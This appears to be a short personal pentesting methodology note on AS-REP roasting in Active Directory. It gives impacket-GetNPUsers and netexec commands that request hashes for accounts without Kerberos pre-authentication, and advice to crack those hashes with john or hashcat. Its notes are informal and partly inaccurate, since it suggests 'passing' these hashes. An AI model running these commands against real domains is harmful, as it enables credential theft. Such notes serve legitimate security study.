Asreproasting:

This attack will only work on users who has kerberos pre-authentification disabled for when requesting tgt to kerberos(i think, kinda)
After getting a list of usernames on the domain, we can supply this to hopefully get a hash hash back. 
We can get a list of usernames on the domain using enum4linux for instance.





After this, pass the hash around, and/or crack the hash with john, hashcat, or crackstation.

impacket-GetNPUsers test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt -outputfile hashes.txt

netexec ldap $target -u 'users' -p '' -k --asrep asrep.hash --dns-server $target


![unnamed_1464e4327c00428a9c821ceb2228c862](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Enumeration/General%20impacket%20syntax/GetNPUsers/{{notename}}-202605011742.png)
